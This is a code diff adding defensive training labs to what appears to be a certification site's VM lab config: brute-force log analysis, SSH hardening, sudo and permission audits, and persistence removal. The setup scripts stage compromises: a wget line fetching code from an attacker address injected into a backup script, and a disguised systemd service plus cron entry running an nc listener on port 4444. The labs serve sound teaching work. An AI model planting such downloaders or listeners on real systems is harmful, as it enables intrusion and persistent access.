@@ -235,11 +235,125 @@ CertHub.vmLabs = {
         { keep: true, vm: "server", label: "No rule allows SSH from everyone", cmd: "! iptables -S INPUT | grep -- '--dport 22' | grep -v -- '-s 10\\.10\\.0\\.20' | grep -q ACCEPT" },
         { keep: true, vm: "client", label: "client can still reach SSH on server", cmd: "nc -z -w 5 server 22" },
         { keep: true, vm: "client", label: "client can still ping server", cmd: "ping -c 1 -W 3 server >/dev/null" }
+      ] },
+    // Blue-team labs (group: "blue"): defensive investigation and hardening. Each scenario is staged by its setup.
+    { id: "ssh-investigation", group: "blue", title: "Investigate a brute-force attack in the SSH log", mode: "single", minutes: 20, level: "Intermediate", certs: ["security-plus", "cysa-plus", "sscp", "linux-plus"],
+      setup: "id deploy >/dev/null 2>&1 || { useradd -m -s /bin/bash deploy; echo 'deploy:Summer2024' | chpasswd; }; mkdir -p /root/incident; f=/var/log/auth-review.log; : > $f; for i in $(seq 10 39); do u=root; [ $((i%3)) = 0 ] && u=deploy; [ $((i%3)) = 1 ] && u='invalid user admin'; echo \"Mar 14 02:$i:0$((i%10)) lab sshd[40$i]: Failed password for $u from 203.0.113.45 port 5$i$((i%10)) ssh2\" >> $f; done; for i in 1 2 3 4 5 6 7 8; do echo \"Mar 14 03:1$i:22 lab sshd[51$i]: Failed password for invalid user test$i from 198.51.100.77 port 60$i$i ssh2\" >> $f; done; echo 'Mar 14 02:40:11 lab sshd[4077]: Accepted password for deploy from 203.0.113.45 port 51122 ssh2' >> $f; echo 'Mar 14 08:02:13 lab sshd[6120]: Failed password for student from 192.0.2.10 port 50210 ssh2' >> $f; echo 'Mar 14 08:02:21 lab sshd[6120]: Accepted password for student from 192.0.2.10 port 50210 ssh2' >> $f; chmod 640 $f",
+      intro: "An alert says this server may have been brute-forced overnight. The SSH log is in /var/log/auth-review.log. Find the address that guessed passwords and got in, and the account it broke into; write both to /root/incident/findings.txt; then contain the attack: block that address and lock the account.",
+      steps: [
+        "Count failed logins per address: `sudo grep 'Failed password' /var/log/auth-review.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn`",
+        "Look for a success from a guessing address: `sudo grep 'Accepted' /var/log/auth-review.log`",
+        "One address failed dozens of times and then logged in. The other with only failures never got in, and 192.0.2.10 is a normal user typing a password wrong once.",
+        "Record your findings (address and account): `echo '203.0.113.x deploy' | sudo tee /root/incident/findings.txt`, using the real address",
+        "Block the address: `sudo iptables -I INPUT -s <address> -j DROP`, then save: `sudo mkdir -p /etc/iptables` and `sudo iptables-save | sudo tee /etc/iptables/rules.v4`",
+        "Lock the compromised account: `sudo usermod -L deploy` (and check with `sudo passwd -S deploy`, which shows L)",
+        "In a real incident you would also end the account's sessions, check what it did (`last`, its shell history, cron) and reset its password."
+      ],
+      checks: [
+        { label: "findings.txt names the attacking address", cmd: "grep -qw '203\\.0\\.113\\.45' /root/incident/findings.txt" },
+        { label: "findings.txt names the compromised account", cmd: "grep -qw deploy /root/incident/findings.txt" },
+        { label: "Traffic from the attacker is dropped", cmd: "iptables -S INPUT | grep -Eq -- '-s 203\\.0\\.113\\.45(/32)? .*-j (DROP|REJECT)'" },
+        { label: "The block is saved to /etc/iptables/rules.v4", cmd: "grep -Eq -- '-s 203\\.0\\.113\\.45(/32)? .*-j (DROP|REJECT)' /etc/iptables/rules.v4" },
+        { label: "The deploy account is locked", cmd: "passwd -S deploy | awk '{print $2}' | grep -qx L" },
+        { keep: true, label: "The innocent address 192.0.2.10 isn't blocked", cmd: "! iptables -S INPUT | grep -q '192\\.0\\.2\\.10'" }
+      ] },
+    { id: "ssh-hardening", group: "blue", title: "Harden the SSH server", mode: "single", minutes: 15, level: "Intermediate", certs: ["security-plus", "linux-plus", "rhcsa", "sscp", "securityx"],
+      intro: "Apply a hardening baseline to SSH: no direct root login, at most 3 password attempts per connection, 30 seconds to log in, and no X11 forwarding. Use a drop-in file so package updates don't overwrite your changes.",
+      steps: [
+        "See the settings in effect now: `sudo sshd -T | grep -E 'permitrootlogin|maxauthtries|logingracetime|x11forwarding'`",
+        "Create a drop-in: `sudo vi /etc/ssh/sshd_config.d/10-hardening.conf` with the lines `PermitRootLogin no`, `MaxAuthTries 3`, `LoginGraceTime 30` and `X11Forwarding no`",
+        "Files in sshd_config.d are read before the main file, and for most settings the first value wins, so a drop-in beats the defaults in sshd_config.",
+        "Check the syntax before applying: `sudo sshd -t` (no output means it's valid)",
+        "Apply it without dropping existing sessions: `sudo systemctl reload ssh`",
+        "Confirm: run the `sshd -T` command from step 1 again"
+      ],
+      checks: [
+        { label: "Root can't log in over SSH", cmd: "sshd -T 2>/dev/null | grep -qx 'permitrootlogin no'" },
+        { label: "At most 3 authentication attempts", cmd: "sshd -T 2>/dev/null | grep -qx 'maxauthtries 3'" },
+        { label: "30 seconds to log in", cmd: "sshd -T 2>/dev/null | grep -qx 'logingracetime 30'" },
+        { label: "X11 forwarding is off", cmd: "sshd -T 2>/dev/null | grep -qx 'x11forwarding no'" },
+        { label: "The settings are in a drop-in file", cmd: "grep -rqsi '^ *PermitRootLogin *no' /etc/ssh/sshd_config.d/" },
+        { keep: true, label: "The configuration is valid and SSH is running", cmd: "sshd -t && systemctl is-active ssh" }
+      ] },
+    { id: "file-integrity", group: "blue", title: "Find a tampered file with a hash baseline", mode: "single", minutes: 15, level: "Intermediate", certs: ["security-plus", "cysa-plus", "sscp", "linux-plus"],
+      setup: "mkdir -p /opt/app/bin /opt/app/release /var/lib/app /root/incident; printf '#!/bin/bash\\n# Nightly backup of the app data\\ntar -czf /var/backups/app.tar.gz /opt/app/data\\n' > /opt/app/bin/backup.sh; printf '#!/bin/bash\\n# Rotate app logs\\nfind /var/log/app -name \"*.log\" -mtime +14 -delete\\n' > /opt/app/bin/rotate.sh; printf '#!/bin/bash\\n# Health check\\nsystemctl is-active ssh\\n' > /opt/app/bin/health.sh; chmod 755 /opt/app/bin/*.sh; cp -p /opt/app/bin/*.sh /opt/app/release/; (cd /opt/app/bin && sha256sum /opt/app/bin/*.sh > /var/lib/app/baseline.sha256); chmod 444 /var/lib/app/baseline.sha256; printf '# added outside change control\\nwget -q -O /tmp/.u http://203.0.113.45/u.sh\\n' >> /opt/app/bin/backup.sh",
+      intro: "When the app was installed, its scripts were fingerprinted with SHA-256 into /var/lib/app/baseline.sha256. Check them against the baseline, find the file that changed, record it in /root/incident/changed.txt, and restore the approved copy from /opt/app/release.",
+      steps: [
+        "Compare every file with the baseline: `sha256sum -c /var/lib/app/baseline.sha256`",
+        "One line says FAILED. Look at what changed: `diff /opt/app/release/backup.sh /opt/app/bin/backup.sh` (use the file that failed)",
+        "Record it: `echo /opt/app/bin/<file> | sudo tee /root/incident/changed.txt`",
+        "Restore the approved version, keeping its permissions: `sudo cp -p /opt/app/release/<file> /opt/app/bin/`",
+        "Check again: `sha256sum -c /var/lib/app/baseline.sha256` should say OK for every file",
+        "Never fix a mismatch by regenerating the baseline: that would approve the attacker's change. Tools like AIDE and Tripwire automate this same check."
+      ],
+      checks: [
+        { label: "changed.txt names the tampered file", cmd: "grep -q '/opt/app/bin/backup.sh' /root/incident/changed.txt && ! grep -qE 'rotate|health' /root/incident/changed.txt" },
+        { label: "Every script matches the baseline again", cmd: "sha256sum -c --quiet /var/lib/app/baseline.sha256" },
+        { label: "The injected download line is gone", cmd: "! grep -q '203\\.0\\.113\\.45' /opt/app/bin/backup.sh" },
+        { keep: true, label: "The baseline wasn't regenerated", cmd: "grep -q \"$(sha256sum /opt/app/release/backup.sh | cut -d' ' -f1)  /opt/app/bin/backup.sh\" /var/lib/app/baseline.sha256" }
+      ] },
+    { id: "sudo-audit", group: "blue", title: "Audit sudo rights and accounts", mode: "single", minutes: 20, level: "Intermediate", certs: ["security-plus", "linux-plus", "sscp", "isc2-cc", "cysa-plus"],
+      setup: "chmod 440 /etc/sudoers; groupadd -f ops; id olivia >/dev/null 2>&1 || useradd -m -G ops olivia; echo '%ops ALL=(root) NOPASSWD: /usr/bin/systemctl restart ssh' > /etc/sudoers.d/ops; id tempadmin >/dev/null 2>&1 || useradd -m tempadmin; echo 'tempadmin ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/90-temp; id intern >/dev/null 2>&1 || useradd -m -G sudo intern; id contractor >/dev/null 2>&1 || useradd -m contractor; echo 'contractor:Contract0r-2023' | chpasswd; chmod 440 /etc/sudoers.d/ops /etc/sudoers.d/90-temp",
+      intro: "A quarterly access review found problems: tempadmin still has full root rights without a password from an old project, intern was added to the sudo group by mistake, and contractor's contract has ended. Fix all three without touching the legitimate ops rule for olivia.",
+      steps: [
+        "List who can use sudo: `getent group sudo` and `sudo ls -l /etc/sudoers.d/` then `sudo cat /etc/sudoers.d/*`",
+        "Check one user's rights: `sudo -l -U tempadmin`",
+        "Remove tempadmin's blanket rule: `sudo rm /etc/sudoers.d/90-temp` (or edit it with `sudo visudo -f /etc/sudoers.d/90-temp`)",
+        "Take intern out of the sudo group: `sudo gpasswd -d intern sudo`",
+        "Disable contractor without deleting the files: `sudo usermod -L -e 1 contractor` (locks the password and expires the account)",
+        "Check the sudo configuration is still valid: `sudo visudo -c`",
+        "Confirm olivia still has exactly her one command: `sudo -l -U olivia`"
+      ],
+      checks: [
+        { label: "tempadmin has no sudo rights", cmd: "sudo -l -U tempadmin 2>&1 | grep -q 'not allowed'" },
+        { label: "intern isn't in the sudo group", cmd: "! id -nG intern | tr ' ' '\\n' | grep -qx sudo" },
+        { label: "contractor's password is locked", cmd: "passwd -S contractor | awk '{print $2}' | grep -qx L" },
+        { label: "contractor's account has expired", cmd: "e=$(getent shadow contractor | cut -d: -f8); [ -n \"$e\" ] && [ \"$e\" -le $(( $(date +%s) / 86400 )) ]" },
+        { keep: true, label: "The sudo configuration is valid", cmd: "visudo -c -q" },
+        { keep: true, label: "olivia can still restart SSH", cmd: "sudo -l -U olivia | grep -q '/usr/bin/systemctl restart ssh'" }
+      ] },
+    { id: "permissions-audit", group: "blue", title: "Find risky SUID and world-writable files", mode: "single", minutes: 15, level: "Intermediate", certs: ["security-plus", "linux-plus", "cysa-plus", "sscp"],
+      setup: "cp /usr/bin/find /usr/local/bin/findx; chmod 4755 /usr/local/bin/findx; printf 'db_host=10.10.0.10\\ndb_user=app\\n' > /etc/app.conf; chmod 666 /etc/app.conf; mkdir -p /srv/share; chmod 777 /srv/share",
+      intro: "Someone left three risky permissions on this server: an extra program that runs as root for anyone (SUID), a configuration file anyone can change, and a shared folder where anyone can delete anyone else's files. Find and fix them without breaking the system's legitimate SUID programs.",
+      steps: [
+        "List SUID programs: `sudo find / -xdev -perm -4000 -type f 2>/dev/null`. Normal ones live in /usr/bin and /usr/sbin (passwd, sudo, su, mount...). Anything in /usr/local or a home folder deserves a question.",
+        "Remove the SUID bit from the copy of find: `sudo chmod u-s /usr/local/bin/findx` (or delete it)",
+        "Find world-writable files: `sudo find /etc /srv -xdev -perm -0002 ! -type l 2>/dev/null`",
+        "Fix the config file: `sudo chown root:root /etc/app.conf` and `sudo chmod 640 /etc/app.conf`",
+        "Shared folders need the sticky bit so people can only delete their own files: `sudo chmod 1777 /srv/share` (like /tmp)",
+        "Check your work with the two find commands again"
+      ],
+      checks: [
+        { label: "No SUID programs in /usr/local", cmd: "[ -z \"$(find /usr/local -xdev -perm -4000 -type f 2>/dev/null)\" ]" },
+        { label: "/etc/app.conf isn't world-writable", cmd: "[ -e /etc/app.conf ] && [ $(( 8#$(stat -c %a /etc/app.conf) & 2 )) -eq 0 ]" },
+        { label: "/srv/share has the sticky bit or isn't world-writable", cmd: "m=8#$(stat -c %a /srv/share); [ $(( m & 01000 )) -ne 0 ] || [ $(( m & 2 )) -eq 0 ]" },
+        { keep: true, label: "passwd and sudo still work (SUID kept)", cmd: "[ -u /usr/bin/passwd ] && [ -u /usr/bin/sudo ]" }
+      ] },
+    { id: "persistence", group: "blue", title: "Find and remove an unknown listener", mode: "single", minutes: 20, level: "Advanced", certs: ["security-plus", "cysa-plus", "linux-plus", "securityx"],
+      setup: "mkdir -p /usr/local/lib/.sysupd /root/incident; printf '#!/bin/bash\\nexec nc -lk 4444 >/dev/null 2>&1\\n' > /usr/local/lib/.sysupd/updater.sh; chmod 755 /usr/local/lib/.sysupd/updater.sh; printf '[Unit]\\nDescription=System update helper\\n[Service]\\nExecStart=/usr/local/lib/.sysupd/updater.sh\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/sys-update-helper.service; systemctl daemon-reload; systemctl enable --now sys-update-helper.service >/dev/null 2>&1; (crontab -l 2>/dev/null; echo '@reboot /usr/local/lib/.sysupd/updater.sh') | crontab -; sleep 1",
+      intro: "A network scan shows this server listening on TCP port 4444, which nothing on it should use. Find which program and service own the port, note them in /root/incident/listener.txt, and remove the listener and every way it restarts itself.",
+      steps: [
+        "Find what listens: `sudo ss -ltnp` and look for :4444 (the process and PID are in the last column)",
+        "Find the program behind the PID: `sudo ls -l /proc/<PID>/exe` and `ps -o pid,ppid,cmd -p <PID>`",
+        "Find the service: `systemctl status <PID>` names the unit that started it",
+        "Record what you found (the unit name and the port): `echo 'sys-update-helper.service 4444' | sudo tee /root/incident/listener.txt`",
+        "Stop it and stop it coming back: `sudo systemctl disable --now sys-update-helper`, then delete the unit file and run `sudo systemctl daemon-reload`",
+        "Look for other persistence: `sudo crontab -l`, `ls /etc/cron.d`, `systemctl list-timers`. Remove the cron line with `sudo crontab -e`.",
+        "Delete the program's folder: `sudo rm -r /usr/local/lib/.sysupd`, then confirm with `sudo ss -ltnp`"
+      ],
+      checks: [
+        { label: "listener.txt names the service and the port", cmd: "grep -q sys-update-helper /root/incident/listener.txt && grep -qw 4444 /root/incident/listener.txt" },
+        { label: "Nothing listens on port 4444", cmd: "! ss -ltn | grep -Eq '[:.]4444[[:space:]]'" },
+        { label: "The service is stopped and won't start at boot", cmd: "! systemctl is-active -q sys-update-helper 2>/dev/null && ! systemctl is-enabled -q sys-update-helper 2>/dev/null" },
+        { label: "The cron entry is gone", cmd: "! crontab -l 2>/dev/null | grep -q sysupd" },
+        { label: "The program's folder is deleted", cmd: "[ ! -e /usr/local/lib/.sysupd ]" },
+        { keep: true, label: "SSH is still running", cmd: "systemctl is-active ssh" }
       ] }
   ],
   // The VM exam: a timed set of tasks on one VM, scored by the same checks. Tasks are drawn at random.
   exam: {
     minutes: 45, tasks: 6, pass: 70,
-    pool: ["users", "shared-dir", "acl", "sudo", "service", "timer", "cron", "partitions", "journal", "processes", "firewall"]
+    pool: ["users", "shared-dir", "acl", "sudo", "service", "timer", "cron", "partitions", "journal", "processes", "firewall",
+      "ssh-hardening", "file-integrity", "sudo-audit", "permissions-audit", "persistence"]
   }
 };
